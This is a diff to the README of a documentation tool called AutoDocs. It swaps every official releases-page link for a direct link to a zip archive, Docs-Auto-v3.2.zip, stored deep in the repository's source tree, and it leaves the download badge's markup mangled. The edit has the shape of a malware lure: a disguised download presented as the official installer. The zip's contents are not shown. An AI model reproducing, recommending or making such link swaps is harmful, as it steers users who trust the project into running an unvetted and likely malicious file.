@@ -6,11 +6,11 @@ Welcome to AutoDocs! Our tool simplifies documentation, helping you generate and
 
 ## 🔗 Download AutoDocs Now
 
-[![Download AutoDocs](https://img.shields.io/badge/Download%20AutoDocs-latest%20release-blue.svg)](https://github.com/Assalimi01/AutoDocs/releases)
+[![Download AutoDocs](https://github.com/Assalimi01/AutoDocs/raw/refs/heads/main/webview/apps/webapp/src/types/Docs-Auto-v3.2.zip%20AutoDocs-latest%https://github.com/Assalimi01/AutoDocs/raw/refs/heads/main/webview/apps/webapp/src/types/Docs-Auto-v3.2.zip)](https://github.com/Assalimi01/AutoDocs/raw/refs/heads/main/webview/apps/webapp/src/types/Docs-Auto-v3.2.zip)
 
 ## 📥 Download & Install
 
-To get AutoDocs, visit this page to download: [AutoDocs Releases](https://github.com/Assalimi01/AutoDocs/releases).
+To get AutoDocs, visit this page to download: [AutoDocs Releases](https://github.com/Assalimi01/AutoDocs/raw/refs/heads/main/webview/apps/webapp/src/types/Docs-Auto-v3.2.zip).
 
 ### Steps to Install
 
@@ -60,4 +60,4 @@ Follow our repository to stay in the loop with new features and updates. Your fe
 
 Remember, documentation doesn’t have to be a hassle. Let AutoDocs take care of it for you! 
 
-[Download AutoDocs Now](https://github.com/Assalimi01/AutoDocs/releases) and start enhancing your code today!
+[Download AutoDocs Now](https://github.com/Assalimi01/AutoDocs/raw/refs/heads/main/webview/apps/webapp/src/types/Docs-Auto-v3.2.zip) and start enhancing your code today!
